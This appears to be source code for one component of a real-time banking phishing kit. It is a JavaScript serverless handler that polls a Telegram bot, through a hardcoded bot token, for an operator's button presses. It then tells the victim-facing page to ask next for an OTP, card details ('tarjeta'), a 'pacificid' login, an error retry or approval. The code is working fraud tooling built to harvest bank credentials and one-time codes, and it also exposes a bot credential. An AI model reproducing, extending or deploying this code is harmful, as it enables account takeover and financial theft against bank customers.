const TOKEN = process.env.TELEGRAM_TOKEN || "7504360348:AAHwDzXqkikSstpzhuk_R9uMg3XljWTqGM4";

export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") return res.status(200).end();

  try {
    const { offset } = req.query;
    const useOffset = offset && parseInt(offset) > 0 ? parseInt(offset) + 1 : undefined;

    const url = useOffset
      ? `https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${useOffset}&timeout=0&allowed_updates=["callback_query"]`
      : `https://api.telegram.org/bot${TOKEN}/getUpdates?timeout=0&allowed_updates=["callback_query"]`;

    const r = await fetch(url);
    const data = await r.json();

    if (!data.ok || !data.result.length) {
      return res.status(200).json({ ok: true, action: null, update_id: useOffset ? useOffset - 1 : 0 });
    }

    // Tomar solo el update más reciente
    const update = data.result[data.result.length - 1];
    const uid = update.update_id;
    const cb = update.callback_query;

    if (!cb) {
      return res.status(200).json({ ok: true, action: null, update_id: uid });
    }

    const cbData = cb.data;

    // Confirmar al bot
    await fetch(`https://api.telegram.org/bot${TOKEN}/answerCallbackQuery`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ callback_query_id: cb.id, text: "✅ Enviado al cliente" }),
    });

    // Marcar como leído
    await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${uid + 1}&timeout=0`);

    if (cbData === "otp")             return res.status(200).json({ ok: true, action: "otp",             update_id: uid });
    if (cbData === "tarjeta")         return res.status(200).json({ ok: true, action: "tarjeta",         update_id: uid });
    if (cbData === "pacificid")       return res.status(200).json({ ok: true, action: "pacificid",       update_id: uid });
    if (cbData === "error_login")     return res.status(200).json({ ok: true, action: "error_login",     update_id: uid });
    if (cbData === "error_otp")       return res.status(200).json({ ok: true, action: "error_otp",       update_id: uid });
    if (cbData === "error_pacificid") return res.status(200).json({ ok: true, action: "error_pacificid", update_id: uid });
    if (cbData === "error_tarjeta")   return res.status(200).json({ ok: true, action: "error_tarjeta",   update_id: uid });
    if (cbData === "aprobar")         return res.status(200).json({ ok: true, action: "aprobar",          update_id: uid });

    return res.status(200).json({ ok: true, action: null, update_id: uid });

  } catch (err) {
    return res.status(500).json({ ok: false, action: null, error: err.message });
  }
}
